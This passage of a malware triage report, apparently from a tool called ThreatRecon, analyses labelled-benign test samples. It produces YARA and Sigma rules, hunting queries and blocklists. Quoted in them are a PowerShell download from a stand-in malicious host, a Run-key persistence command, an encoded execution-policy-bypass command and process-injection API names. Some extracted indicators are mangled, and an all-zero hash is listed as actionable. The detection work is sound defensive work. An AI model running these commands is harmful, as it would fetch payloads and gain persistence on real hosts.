$s10 = \"New-ItemProperty -Path \\\"HKCU:\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run\\\" -Name \\\"AuditSample2\\\" -Value \\\"powe\" nocase // Registry strings\n    $s11 = \"# ThreatRecon audit sample 2 - benign PowerShell text only\" nocase // PowerShell strings\n    $s12 = \"powershell.exe -NoProfile -ExecutionPolicy Bypass -EncodedCommand VwByAGkAdABlAC0ATwB1AHQAcAB1AHQAIAAiAEEAdQBkAGkAdABTAG\" nocase // PowerShell strings\n  condition:\n    3 of them\n}",
    "splunk": [
      "index=* \"http://example-malicious-test.com/payload.ps1\"",
      "index=* \"# ThreatRecon audit sample 2 - benign PowerShell text only\"",
      "index=* \"powershell.exe -NoProfile -ExecutionPolicy Bypass -EncodedCommand VwByAGkAdABlAC0ATwB1AHQAcAB1AHQAIAAiAEEAdQBkAGkAdABTAG\"",
      "index=* \"New-ItemProperty -Path \\\"HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\\" -Name \\\"AuditSample2\\\" -Value \\\"powershell.exe\"",
      "index=* \"Invoke-WebRequest -Uri \\\"http://example-malicious-test.com/payload.ps1\\\" -OutFile \\\"$env:TEMP\\payload.ps1\\\"\""
    ],
    "defender": [
      "DeviceProcessEvents\n| where ProcessCommandLine contains \"http://example-malicious-test.com/payload.ps1\"",
      "DeviceProcessEvents\n| where ProcessCommandLine contains \"# ThreatRecon audit sample 2 - benign PowerShell text only\"",
      "DeviceProcessEvents\n| where ProcessCommandLine contains \"powershell.exe -NoProfile -ExecutionPolicy Bypass -EncodedCommand VwByAGkAdABlAC0ATwB1AHQAcAB1AHQAIAAiAEEAdQBkAGkAdABTAG\"",
      "DeviceProcessEvents\n| where ProcessCommandLine contains \"New-ItemProperty -Path \\\"HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\\" -Name \\\"AuditSample2\\\" -Value \\\"powershell.exe\"",
      "DeviceProcessEvents\n| where ProcessCommandLine contains \"Invoke-WebRequest -Uri \\\"http://example-malicious-test.com/payload.ps1\\\" -OutFile \\\"$env:TEMP\\payload.ps1\\\"\""
    ],
    "elastic": [
      "process.command_line : \"*http://example-malicious-test.com/payload.ps1*\"",
      "process.command_line : \"*# ThreatRecon audit sample 2 - benign PowerShell text only*\"",
      "process.command_line : \"*powershell.exe -NoProfile -ExecutionPolicy Bypass -EncodedCommand VwByAGkAdABlAC0ATwB1AHQAcAB1AHQAIAAiAEEAdQBkAGkAdABTAG*\"",
      "process.command_line : \"*New-ItemProperty -Path \\\"HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\\" -Name \\\"AuditSample2\\\" -Value \\\"powershell.exe*\"",
      "process.command_line : \"*Invoke-WebRequest -Uri \\\"http://example-malicious-test.com/payload.ps1\\\" -OutFile \\\"$env:TEMP\\payload.ps1\\\"*\""
    ],
    "firewallBlocklist": [
      "http://example-malicious-test.com/payload.ps1"
    ],
    "dnsBlocklist": [],
    "edrHashHunts": []
  },
  "threatIntelPivots": [
    {
      "ioc": "http://example-malicious-test.com/payload.ps1",
      "normalizedValue": "http://example-malicious-test.com/payload.ps1",
      "type": "url",
      "actionable": true,
      "provider": "VirusTotal",
      "url": "https://www.virustotal.com/gui/search/http%3A%2F%2Fexample-malicious-test.com%2Fpayload.ps1",
      "note": "Manual pivot only. ThreatRecon does not automatically submit samples or IOCs.",
      "reason": "URL indicator requiring validation."
    },
    {
      "ioc": "http://example-malicious-test.com/payload.ps1",
      "normalizedValue": "http://example-malicious-test.com/payload.ps1",
      "type": "url",
      "actionable": true,
      "provider": "URLhaus",
      "url": "https://urlhaus.abuse.ch/browse.php?search=http%3A%2F%2Fexample-malicious-test.com%2Fpayload.ps1",
      "note": "Manual pivot only. ThreatRecon does not automatically submit samples or IOCs.",
      "reason": "URL indicator requiring validation."
    },
    {
      "ioc": "http://example-malicious-test.com/payload.ps1",
      "normalizedValue": "http://example-malicious-test.com/payload.ps1",
      "type": "url",
      "actionable": true,
      "provider": "AlienVault OTX",
      "url": "https://otx.alienvault.com/indicator/url/http%3A%2F%2Fexample-malicious-test.com%2Fpayload.ps1",
      "note": "Manual pivot only. ThreatRecon does not automatically submit samples or IOCs.",
      "reason": "URL indicator requiring validation."
    },
    {
      "ioc": "http://example-malicious-test.com/payload.ps1",
      "normalizedValue": "http://example-malicious-test.com/payload.ps1",
      "type": "url",
      "actionable": true,
      "provider": "ThreatFox",
      "url": "https://threatfox.abuse.ch/browse.php?search=http%3A%2F%2Fexample-malicious-test.com%2Fpayload.ps1",
      "note": "Manual pivot only. ThreatRecon does not automatically submit samples or IOCs.",
      "reason": "URL indicator requiring validation."
    }
  ],
  "skippedThreatIntelPivots": [
    {
      "ioc": "HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run",
      "normalizedValue": "HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run",
      "type": "registry_key",
      "actionable": false,
      "reason": "Skipped: not suitable for reputation pivot",
      "category": "not-suitable"
    },
    {
      "ioc": "C:\\Users\\Public\\audit-sample2.ps1",
      "normalizedValue": "C:\\Users\\Public\\audit-sample2.ps1",
      "type": "file_path",
      "actionable": false,
      "reason": "Skipped: not suitable for reputation pivot",
      "category": "not-suitable"
    }
  ],
  "deobfuscated": [
    {
      "type": "PowerShell EncodedCommand",
      "raw": "VwByAGkAdABlAC0ATwB1AHQAcAB1AHQAIAAiAEEAdQBkAGkAdABTAGEAbQBwAGwAZQAyACIAOwAgAHcAaABvAGEAbQBpACAALwBhAGwAbAA=",
      "decoded": "Write-Output \"AuditSample2\"; whoami /all"
    }
  ],
  "blocklist": [
    "http://example-malicious-test.com/payload.ps1"
  ]
}
```
### IOC CSV
```csv
type,value,source,confidence,notes
url,http://example-malicious-test.com/payload.ps1,ThreatRecon local extraction,Medium,actionable=yes | URL indicator requiring validation. | Validate reputation and consider DNS/proxy/URL block only if confirmed malicious.
registry_key,HKCU:\Software\Microsoft\Windows\CurrentVersion\Run,ThreatRecon local extraction,High,actionable=no | Registry path is a host hunt indicator | Hunt endpoint telemetry and autoruns.
file_path,C:\Users\Public\audit-sample2.ps1,ThreatRecon local extraction,Medium,actionable=no | File path is a host hunt indicator | Hunt endpoint file/process telemetry.
```
### Blocklist
```text
# ThreatRecon blocklist export
# Actionable public IPs, domains, URLs, and hashes only
# Local/private, reserved documentation, demo/test, and known public resolver indicators are excluded.
http://example-malicious-test.com/payload.ps1
```
### YARA
```yara
rule ThreatRecon_Suspicious_Script {
  meta:
    description = "Draft rule generated from local static triage"
    author = "ThreatRecon"
    source = "Local browser analysis"
    confidence = "medium"
  strings:
    $s1 = "Encoded PowerShell command — obfuscated payload delivery" nocase // behavior
    $s2 = "PowerShell execution policy bypass" nocase // behavior
    $s3 = "Network download cradle — remote payload staging" nocase // behavior
    $s4 = "Registry Run key modification — persistence" nocase // behavior
    $s5 = "Large Base64 encoded blob — likely embedded payload" nocase // behavior
    $s6 = "HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" nocase // artifact
    $s7 = "C:\\Users\\Public\\audit-sample2.ps1" nocase // artifact
    $s8 = "http://example-malicious-test.com/payload.ps1" nocase // network
    $s9 = "Invoke-WebRequest -Uri \"http://example-malicious-test.com/payload.ps1\" -OutFile \"$env:TEMP\\payload.ps1\"" nocase // Network indicators
    $s10 = "New-ItemProperty -Path \"HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\" -Name \"AuditSample2\" -Value \"powe" nocase // Registry strings
    $s11 = "# ThreatRecon audit sample 2 - benign PowerShell text only" nocase // PowerShell strings
    $s12 = "powershell.exe -NoProfile -ExecutionPolicy Bypass -EncodedCommand VwByAGkAdABlAC0ATwB1AHQAcAB1AHQAIAAiAEEAdQBkAGkAdABTAG" nocase // PowerShell strings
  condition:
    3 of them
}
```
### Sigma
```yaml
title: ThreatRecon Encoded PowerShell
id: 00000000-0000-4000-8000-000000000000
status: experimental
description: Draft Sigma rule generated from local static triage. Analyst review required before production use.
logsource:
  product: windows
  category: process_creation
detection:
  selection:
    CommandLine|contains:
      - "powershell"
      - "-enc"
      - "CurrentVersion\\\\Run"
      - "HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run"
      - "http://example-malicious-test.com/payload.ps1"
      - "C:\\Users\\Public\\audit-sample2.ps1"
      - "powershell.exe -NoProfile -ExecutionPolicy Bypass -EncodedCommand VwByAGkAdABlAC0ATwB1AHQAcAB1AHQAIAAiAEEAdQBkAGkAdABTAGEAbQBwAGwAZQAyACIAOwAgAHcAaABvAGEAbQBpACAALwBhAGwAbAA="
      - "New-ItemProperty -Path \"HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\" -Name \"AuditSample2\" -Value \"powershell.exe -File C:\\Users\\Public\\audit-sample2.ps1\""
  condition: selection
falsepositives:
  - Administrative scripts
  - Security testing
level: high
tags:
  - attack.t1059_001
  - attack.t1027_010
  - attack.t1547_001
  - attack.t1105
  - attack.t1027
  - attack.t1071
```


# sample3.bin

## 1. Static Metadata
```json
{
  "byteLength": 498,
  "lines": 2,
  "entropy": 5.841777569060415,
  "peTriage": {
    "detected": false,
    "hasMZ": false,
    "hasPE": false,
    "fileType": "No PE structure detected",
    "architecture": "Not available",
    "timestamp": null,
    "subsystem": null,
    "dllCharacteristics": [],
    "imageBase": null,
    "entryPointRva": null,
    "sections": [],
    "imports": [],
    "importDlls": [],
    "exports": [],
    "suspiciousApiStrings": [
      "VirtualAllocEx",
      "WriteProcessMemory",
      "CreateRemoteThread",
      "VirtualAlloc"
    ],
    "packedIndicators": [],
    "warnings": [],
    "realImportTableParsed": false,
    "packerHints": []
  }
}
```

## 2. Strings Extraction
### Printable Strings
```text
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA)r
MZ_AUDIT_SAMPLE_NOT_A_REAL_PE
VirtualAllocEx
WriteProcessMemory
CreateRemoteThread
http://example-malicious-test.com/bin
HKCU\Software\BinarySample\Run
powershell -enc SQBFAFgA
0000000000000000000000000000000000000000000000000000000000000000
```
### Classified Strings
```json
[
  {
    "type": "network",
    "val": "http://example-malicious-test.com/bin"
  }
]
```
### Strings Intelligence
```json
[
  {
    "name": "Network indicators",
    "confidence": "High",
    "explanation": "Static string category. Analyst validation required.",
    "items": [
      "http://example-malicious-test.com/bin"
    ]
  },
  {
    "name": "URLs and domains",
    "confidence": "High",
    "explanation": "Static string category. Analyst validation required.",
    "items": [
      "http://example-malicious-test.com/bin"
    ]
  },
  {
    "name": "Windows API strings",
    "confidence": "Medium",
    "explanation": "Static string category. Analyst validation required.",
    "items": [
      "VirtualAllocEx",
      "WriteProcessMemory",
      "CreateRemoteThread"
    ]
  },
  {
    "name": "PowerShell strings",
    "confidence": "High",
    "explanation": "Static string category. Analyst validation required.",
    "items": [
      "powershell -enc SQBFAFgA"
    ]
  },
  {
    "name": "Suspicious commands",
    "confidence": "High",
    "explanation": "Static string category. Analyst validation required.",
    "items": [
      "powershell -enc SQBFAFgA"
    ]
  }
]
```

## 3. Suspicious API Detection
```json
{
  "suspiciousApiStrings": [
    "VirtualAllocEx",
    "WriteProcessMemory",
    "CreateRemoteThread",
    "VirtualAlloc"
  ],
  "apiRisk": [
    {
      "api": "VirtualAllocEx",
      "category": "Process injection",
      "risk": "High",
      "why": "Allocates memory inside another process, often before code injection.",
      "detectedAs": "string only"
    },
    {
      "api": "WriteProcessMemory",
      "category": "Process injection",
      "risk": "High",
      "why": "Writes bytes into another process, commonly paired with remote thread creation.",
      "detectedAs": "string only"
    },
    {
      "api": "CreateRemoteThread",
      "category": "Process injection",
      "risk": "High",
      "why": "Starts execution in a remote process.",
      "detectedAs": "string only"
    },
    {
      "api": "VirtualAlloc",
      "category": "Memory allocation",
      "risk": "Medium",
      "why": "Allocates executable memory for unpacking, shellcode, or loaders.",
      "detectedAs": "string only"
    }
  ]
}
```

## 4. IOC Extraction
```json
{
  "iocs": {
    "ips": [],
    "localIndicators": [],
    "urls": [
      "http://example-malicious-test.com/bin\u0000HKCU\\Software\\BinarySample\\Run\u0000powershell"
    ],
    "domains": [],
    "onion": [],
    "md5": [],
    "sha1": [],
    "sha256": [
      "0000000000000000000000000000000000000000000000000000000000000000"
    ],
    "emails": [],
    "registry": [
      "HKCU\\Software\\BinarySample\\Run\u0000powershell"
    ],
    "paths": [],
    "btc": [],
    "cve": [],
    "mutex": []
  },
  "actionability": [
    {
      "type": "url",
      "value": "http://example-malicious-test.com/bin\u0000HKCU\\Software\\BinarySample\\Run\u0000powershell",
      "confidence": "Medium",
      "actionable": true,
      "reason": "URL indicator requiring validation.",
      "recommendedAction": "Validate reputation and consider DNS/proxy/URL block only if confirmed malicious."
    },
    {
      "type": "registry_key",
      "value": "HKCU\\Software\\BinarySample\\Run\u0000powershell",
      "confidence": "High",
      "actionable": false,
      "reason": "Registry path is a host hunt indicator",
      "recommendedAction": "Hunt endpoint telemetry and autoruns."
    },
    {
      "type": "hash",
      "value": "0000000000000000000000000000000000000000000000000000000000000000",
      "confidence": "High",
      "actionable": true,
      "reason": "Hash indicator",
      "recommendedAction": "Use for EDR hash hunts; block only after validation."
    }
  ],
  "threatIntelPivots": [
    {
      "ioc": "http://example-malicious-test.com/bin\u0000HKCU\\Software\\BinarySample\\Run\u0000powershell",
      "normalizedValue": "http://example-malicious-test.com/bin\u0000HKCU\\Software\\BinarySample\\Run\u0000powershell",
      "type": "url",
      "actionable": true,
      "provider": "VirusTotal",
      "url": "https://www.virustotal.com/gui/search/http%3A%2F%2Fexample-malicious-test.com%2Fbin%00HKCU%5CSoftware%5CBinarySample%5CRun%00powershell",
      "note": "Manual pivot only. ThreatRecon does not automatically submit samples or IOCs.",
      "reason": "URL indicator requiring validation."
    },
    {
      "ioc": "http://example-malicious-test.com/bin\u0000HKCU\\Software\\BinarySample\\Run\u0000powershell",
      "normalizedValue": "http://example-malicious-test.com/bin\u0000HKCU\\Software\\BinarySample\\Run\u0000powershell",
      "type": "url",
      "actionable": true,
      "provider": "URLhaus",
      "url": "https://urlhaus.abuse.ch/browse.php?search=http%3A%2F%2Fexample-malicious-test.com%2Fbin%00HKCU%5CSoftware%5CBinarySample%5CRun%00powershell",
      "note": "Manual pivot only. ThreatRecon does not automatically submit samples or IOCs.",
      "reason": "URL indicator requiring validation."
    },
    {
      "ioc": "http://example-malicious-test.com/bin\u0000HKCU\\Software\\BinarySample\\Run\u0000powershell",
      "normalizedValue": "http://example-malicious-test.com/bin\u0000HKCU\\Software\\BinarySample\\Run\u0000powershell",
      "type": "url",
      "actionable": true,
      "provider": "AlienVault OTX",
      "url": "https://otx.alienvault.com/indicator/url/http%3A%2F%2Fexample-malicious-test.com%2Fbin%00HKCU%5CSoftware%5CBinarySample%5CRun%00powershell",
      "note": "Manual pivot only. ThreatRecon does not automatically submit samples or IOCs.",
      "reason": "URL indicator requiring validation."
    },
    {
      "ioc": "http://example-malicious-test.com/bin\u0000HKCU\\Software\\BinarySample\\Run\u0000powershell",
      "normalizedValue": "http://example-malicious-test.com/bin\u0000HKCU\\Software\\BinarySample\\Run\u0000powershell",
      "type": "url",
      "actionable": true,
      "provider": "ThreatFox",
      "url": "https://threatfox.abuse.ch/browse.php?search=http%3A%2F%2Fexample-malicious-test.com%2Fbin%00HKCU%5CSoftware%5CBinarySample%5CRun%00powershell",
      "note": "Manual pivot only. ThreatRecon does not automatically submit samples or IOCs.",
      "reason": "URL indicator requiring validation."
    },
    {
      "ioc": "0000000000000000000000000000000000000000000000000000000000000000",
      "normalizedValue": "0000000000000000000000000000000000000000000000000000000000000000",
      "type": "sha256",
      "actionable": true,
      "provider": "VirusTotal",
      "url": "https://www.virustotal.com/gui/search/0000000000000000000000000000000000000000000000000000000000000000",
      "note": "Manual pivot only. ThreatRecon does not automatically submit samples or IOCs.",
      "reason": "Hash indicator"
    },
    {
      "ioc": "0000000000000000000000000000000000000000000000000000000000000000",
      "normalizedValue": "0000000000000000000000000000000000000000000000000000000000000000",
      "type": "sha256",
      "actionable": true,
      "provider": "MalwareBazaar",
      "url": "https://bazaar.abuse.ch/browse.php?search=sha256%3A0000000000000000000000000000000000000000000000000000000000000000",
      "note": "Manual pivot only. ThreatRecon does not automatically submit samples or IOCs.",
      "reason": "Hash indicator"
    },
    {
      "ioc": "0000000000000000000000000000000000000000000000000000000000000000",
      "normalizedValue": "0000000000000000000000000000000000000000000000000000000000000000",
      "type": "sha256",
      "actionable": true,
      "provider": "ThreatFox",
      "url": "https://threatfox.abuse.ch/browse.php?search=0000000000000000000000000000000000000000000000000000000000000000",
      "note": "Manual pivot only. ThreatRecon does not automatically submit samples or IOCs.",
      "reason": "Hash indicator"
    },
    {
      "ioc": "0000000000000000000000000000000000000000000000000000000000000000",
      "normalizedValue": "0000000000000000000000000000000000000000000000000000000000000000",
      "type": "sha256",
      "actionable": true,
      "provider": "AlienVault OTX",
      "url": "https://otx.alienvault.com/indicator/file/0000000000000000000000000000000000000000000000000000000000000000",
      "note": "Manual pivot only. ThreatRecon does not automatically submit samples or IOCs.",
      "reason": "Hash indicator"
    }
  ],
  "skippedThreatIntelPivots": [
    {
      "ioc": "HKCU\\Software\\BinarySample\\Run\u0000powershell",
      "normalizedValue": "HKCU\\Software\\BinarySample\\Run\u0000powershell",
      "type": "registry_key",
      "actionable": false,
      "reason": "Skipped: not suitable for reputation pivot",
      "category": "not-suitable"
    }
  ]
}
```

## 5. MITRE ATT&CK Mapping
```json
{
  "mitre": [
    "T1027.010",
    "T1055",
    "T1027",
    "T1071"
  ],
  "attackTable": [
    {
      "tactic": "Defense Evasion",
      "techniqueId": "T1027.010",
      "techniqueName": "Command Obfuscation",
      "observedEvidence": "Encoded PowerShell command — obfuscated payload delivery",
      "confidence": "High",
      "detectionIdea": "Hunt for evidence containing \"Encoded PowerShell command — obfuscated payload delivery\" in process, registry, and script telemetry."
    },
    {
      "tactic": "Defense Evasion",
      "techniqueId": "T1055",
      "techniqueName": "Process Injection",
      "observedEvidence": "Reflective DLL / process injection indicators",
      "confidence": "High",
      "detectionIdea": "Hunt for evidence containing \"Reflective DLL / process injection indicators\" in process, registry, and script telemetry."
    },
    {
      "tactic": "Defense Evasion",
      "techniqueId": "T1027",
      "techniqueName": "Obfuscated Files or Info",
      "observedEvidence": "Large Base64 encoded blob — likely embedded payload",
      "confidence": "Medium",
      "detectionIdea": "Hunt for evidence containing \"Large Base64 encoded blob — likely embedded payload\" in process, registry, and script telemetry."
    },
    {
      "tactic": "Command and Control",
      "techniqueId": "T1071",
      "techniqueName": "Application Layer Protocol",
      "observedEvidence": "Technique inferred from IOC or static context",
      "confidence": "Medium",
      "detectionIdea": "Hunt for command lines or processes contacting extracted network IOCs."
    }
  ],
  "attackTimeline": [
    {
      "stage": "Execution",
      "evidence": [
        "Encoded PowerShell command — obfuscated payload delivery"
      ],
      "confidence": "Medium",
      "technique": "T1027.010",
      "validation": "Review process creation and script block logs."
    },
    {
      "stage": "Defense Evasion",
      "evidence": [
        "Encoded PowerShell command — obfuscated payload delivery",
        "Large Base64 encoded blob — likely embedded payload"
      ],
      "confidence": "High",
      "technique": "T1027.010",
      "validation": "Check security control tampering and obfuscation telemetry."
    },
    {
      "stage": "Payload Download",
      "evidence": [
        "Static text matched payload download keywords."
      ],
      "confidence": "Medium",
      "technique": null,
      "validation": "Validate network connections and downloaded file hashes."
    }
  ]
}
```

## 6. YARA Draft Rule
```yara
rule ThreatRecon_Suspicious_Script {
  meta:
    description = "Draft rule generated from local static triage"
    author = "ThreatRecon"
    source = "Local browser analysis"
    confidence = "medium"
  strings:
    $s1 = "Encoded PowerShell command — obfuscated payload delivery" nocase // behavior
    $s2 = "Reflective DLL / process injection indicators" nocase // behavior
    $s3 = "Large Base64 encoded blob — likely embedded payload" nocase // behavior
    $s4 = "VirtualAllocEx" nocase // Process injection
    $s5 = "WriteProcessMemory" nocase // Process injection
    $s6 = "CreateRemoteThread" nocase // Process injection
    $s7 = "VirtualAlloc" nocase // Memory allocation
    $s8 = "HKCU\\Software\\BinarySample\\Run powershell" nocase // artifact
    $s9 = "http://example-malicious-test.com/bin HKCU\\Software\\BinarySample\\Run powershell" nocase // network
    $s10 = "http://example-malicious-test.com/bin" nocase // Network indicators
    $s11 = "powershell -enc SQBFAFgA" nocase // PowerShell strings
  condition:
    3 of them
}
```

## 7. Sigma Draft Rule
```yaml
title: ThreatRecon Encoded PowerShell
id: 00000000-0000-4000-8000-000000000000
status: experimental
description: Draft Sigma rule generated from local static triage. Analyst review required before production use.
logsource:
  product: windows
  category: process_creation
detection:
  selection:
    CommandLine|contains:
      - "powershell"
      - "-enc"
      - "HKCU\\Software\\BinarySample\\Run powershell"
      - "http://example-malicious-test.com/bin HKCU\\Software\\BinarySample\\Run powershell"
      - "MZ_AUDIT_SAMPLE_NOT_A_REAL_PE VirtualAllocEx WriteProcessMemory CreateRemoteThread http://example-malicious-test.com/bin HKCU\\Software\\BinarySample\\Run powershell -enc SQBFAFgA "
  condition: selection
falsepositives:
  - Administrative scripts
  - Security testing
level: high
tags:
  - attack.t1059_001
  - attack.t1027_010
  - attack.t1055
  - attack.t1027
  - attack.t1071
```

## 8. Threat Hunting Output
```json
{
  "huntingQueries": [
    {
      "value": "http://example-malicious-test.com/bin\u0000HKCU\\Software\\BinarySample\\Run\u0000powershell",
      "splunk": "index=* \"http://example-malicious-test.com/bin\u0000HKCU\\Software\\BinarySample\\Run\u0000powershell\"",
      "defender": "DeviceProcessEvents\n| where ProcessCommandLine contains \"http://example-malicious-test.com/bin\u0000HKCU\\Software\\BinarySample\\Run\u0000powershell\"",
      "elastic": "process.command_line : \"*http://example-malicious-test.com/bin\u0000HKCU\\Software\\BinarySample\\Run\u0000powershell*\""
    },
    {
      "value": "0000000000000000000000000000000000000000000000000000000000000000",
      "splunk": "index=* \"0000000000000000000000000000000000000000000000000000000000000000\"",
      "defender": "DeviceProcessEvents\n| where ProcessCommandLine contains \"0000000000000000000000000000000000000000000000000000000000000000\"",
      "elastic": "process.command_line : \"*0000000000000000000000000000000000000000000000000000000000000000*\""
    },
    {
      "value": "MZ_AUDIT_SAMPLE_NOT_A_REAL_PE\u0000VirtualAllocEx\u0000WriteProcessMemory\u0000CreateRemoteThread\u0000http://example-malicious-test.com/bin",
      "splunk": "index=* \"MZ_AUDIT_SAMPLE_NOT_A_REAL_PE\u0000VirtualAllocEx\u0000WriteProcessMemory\u0000CreateRemoteThread\u0000http://example-malicious-test.com/bin\"",
      "defender": "DeviceProcessEvents\n| where ProcessCommandLine contains \"MZ_AUDIT_SAMPLE_NOT_A_REAL_PE\u0000VirtualAllocEx\u0000WriteProcessMemory\u0000CreateRemoteThread\u0000http://example-malicious-test.com/bin\"",
      "elastic": "process.command_line : \"*MZ_AUDIT_SAMPLE_NOT_A_REAL_PE\u0000VirtualAllocEx\u0000WriteProcessMemory\u0000CreateRemoteThread\u0000http://example-malicious-test.com/bin*\""
    }
  ],
  "detectionEngineering": {
    "draftSigma": "title: ThreatRecon Encoded PowerShell\nid: 00000000-0000-4000-8000-000000000000\nstatus: experimental\ndescription: Draft Sigma rule generated from local static triage. Analyst review required before production use.\nlogsource:\n  product: windows\n  category: process_creation\ndetection:\n  selection:\n    CommandLine|contains:\n      - \"powershell\"\n      - \"-enc\"\n      - \"HKCU\\\\Software\\\\BinarySample\\\\Run\u0000powershell\"\n      - \"http://example-malicious-test.com/bin\u0000HKCU\\\\Software\\\\BinarySample\\\\Run\u0000powershell\"\n      - \"MZ_AUDIT_SAMPLE_NOT_A_REAL_PE\u0000VirtualAllocEx\u0000WriteProcessMemory\u0000CreateRemoteThread\u0000http://example-malicious-test.com/bin\u0000HKCU\\\\Software\\\\BinarySample\\\\Run\u0000powershell -enc SQBFAFgA\u0000\"\n  condition: selection\nfalsepositives:\n  - Administrative scripts\n  - Security testing\nlevel: high\ntags:\n  - attack.t1059_001\n  - attack.t1027_010\n  - attack.t1055\n  - attack.t1027\n  - attack.t1071",
    "draftYara": "rule ThreatRecon_Suspicious_Script {\n  meta:\n    description = \"Draft rule generated from local static triage\"\n    author = \"ThreatRecon\"\n    source = \"Local browser analysis\"\n    confidence = \"medium\"\n  strings:\n    $s1 = \"Encoded PowerShell command — obfuscated payload delivery\" nocase // behavior\n    $s2 = \"Reflective DLL / process injection indicators\" nocase // behavior\n    $s3 = \"Large Base64 encoded blob — likely embedded payload\" nocase // behavior\n    $s4 = \"VirtualAllocEx\" nocase // Process injection\n    $s5 = \"WriteProcessMemory\" nocase // Process injection\n    $s6 = \"CreateRemoteThread\" nocase // Process injection\n    $s7 = \"VirtualAlloc\" nocase // Memory allocation\n    $s8 = \"HKCU\\\\Software\\\\BinarySample\\\\Run\u0000powershell\" nocase // artifact\n    $s9 = \"http://example-malicious-test.com/bin\u0000HKCU\\\\Software\\\\BinarySample\\\\Run\u0000powershell\" nocase // network\n    $s10 = \"http://example-malicious-test.com/bin\" nocase // Network indicators\n    $s11 = \"powershell -enc SQBFAFgA\" nocase // PowerShell strings\n  condition:\n    3 of them\n}",
    "splunk": [
      "index=* \"http://example-malicious-test.com/bin\u0000HKCU\\Software\\BinarySample\\Run\u0000powershell\"",
      "index=* \"0000000000000000000000000000000000000000000000000000000000000000\"",
      "index=* \"MZ_AUDIT_SAMPLE_NOT_A_REAL_PE\u0000VirtualAllocEx\u0000WriteProcessMemory\u0000CreateRemoteThread\u0000http://example-malicious-test.com/bin\""
    ],
    "defender": [
      "DeviceProcessEvents\n| where ProcessCommandLine contains \"http://example-malicious-test.com/bin\u0000HKCU\\Software\\BinarySample\\Run\u0000powershell\"",
      "DeviceProcessEvents\n| where ProcessCommandLine contains \"0000000000000000000000000000000000000000000000000000000000000000\"",
      "DeviceProcessEvents\n| where ProcessCommandLine contains \"MZ_AUDIT_SAMPLE_NOT_A_REAL_PE\u0000VirtualAllocEx\u0000WriteProcessMemory\u0000CreateRemoteThread\u0000http://example-malicious-test.com/bin\""
    ],
    "elastic": [
      "process.command_line : \"*http://example-malicious-test.com/bin\u0000HKCU\\Software\\BinarySample\\Run\u0000powershell*\"",
      "process.command_line : \"*0000000000000000000000000000000000000000000000000000000000000000*\"",
      "process.command_line : \"*MZ_AUDIT_SAMPLE_NOT_A_REAL_PE\u0000VirtualAllocEx\u0000WriteProcessMemory\u0000CreateRemoteThread\u0000http://example-malicious-test.com/bin*\""
    ],
    "firewallBlocklist": [
      "http://example-malicious-test.com/bin\u0000HKCU\\Software\\BinarySample\\Run\u0000powershell",
      "0000000000000000000000000000000000000000000000000000000000000000"
    ],
    "dnsBlocklist": [],
    "edrHashHunts": [
      "Search endpoint file/process telemetry for hash 0000000000000000000000000000000000000000000000000000000000000000"
    ]
  }
}
```

## 9. Analyst Report Exports
### Markdown
```markdown
# ThreatRecon Triage Report - sample3.bin

## Static Metadata
- Byte length: 498
- MD5: da78428a281d6b5de7e49b9f9ec016e7
- SHA-1: e852364d84661311bd28c80ab4b2e0bf8784364a
- SHA-256: 78f1123bf46fe26cf8e7547202e5565141377ecaa4c44196c341e17e12be0102
- Entropy: 5.842 bits/byte
- PE type: No PE structure detected
- PE imports: none parsed
- Suspicious API strings: VirtualAllocEx, WriteProcessMemory, CreateRemoteThread, VirtualAlloc

## IOCs
### urls
http://example-malicious-test.com/bin HKCU\Software\BinarySample\Run powershell

### sha256
0000000000000000000000000000000000000000000000000000000000000000

### registry
HKCU\Software\BinarySample\Run powershell

## MITRE ATT&CK
- Defense Evasion | T1027.010 Command Obfuscation | Evidence: Encoded PowerShell command — obfuscated payload delivery | Confidence: High
- Defense Evasion | T1055 Process Injection | Evidence: Reflective DLL / process injection indicators | Confidence: High
- Defense Evasion | T1027 Obfuscated Files or Info | Evidence: Large Base64 encoded blob — likely embedded payload | Confidence: Medium
- Command and Control | T1071 Application Layer Protocol | Evidence: Technique inferred from IOC or static context | Confidence: Medium

## YARA Draft
`\`\`yara
rule ThreatRecon_Suspicious_Script {
  meta:
    description = "Draft rule generated from local static triage"
    author = "ThreatRecon"
    source = "Local browser analysis"
    confidence = "medium"
  strings:
    $s1 = "Encoded PowerShell command — obfuscated payload delivery" nocase // behavior
    $s2 = "Reflective DLL / process injection indicators" nocase // behavior
    $s3 = "Large Base64 encoded blob — likely embedded payload" nocase // behavior
    $s4 = "VirtualAllocEx" nocase // Process injection
    $s5 = "WriteProcessMemory" nocase // Process injection
    $s6 = "CreateRemoteThread" nocase // Process injection
    $s7 = "VirtualAlloc" nocase // Memory allocation
    $s8 = "HKCU\\Software\\BinarySample\\Run powershell" nocase // artifact
    $s9 = "http://example-malicious-test.com/bin HKCU\\Software\\BinarySample\\Run powershell" nocase // network
    $s10 = "http://example-malicious-test.com/bin" nocase // Network indicators
    $s11 = "powershell -enc SQBFAFgA" nocase // PowerShell strings
  condition:
    3 of them
}
`\`\`

## Sigma Draft
`\`\`yaml
title: ThreatRecon Encoded PowerShell
id: 00000000-0000-4000-8000-000000000000
status: experimental
description: Draft Sigma rule generated from local static triage. Analyst review required before production use.
logsource:
  product: windows
  category: process_creation
detection:
  selection:
    CommandLine|contains:
      - "powershell"
      - "-enc"
      - "HKCU\\Software\\BinarySample\\Run powershell"
      - "http://example-malicious-test.com/bin HKCU\\Software\\BinarySample\\Run powershell"
      - "MZ_AUDIT_SAMPLE_NOT_A_REAL_PE VirtualAllocEx WriteProcessMemory CreateRemoteThread http://example-malicious-test.com/bin HKCU\\Software\\BinarySample\\Run powershell -enc SQBFAFgA "
  condition: selection
falsepositives:
  - Administrative scripts
  - Security testing
level: high
tags:
  - attack.t1059_001
  - attack.t1027_010
  - attack.t1055
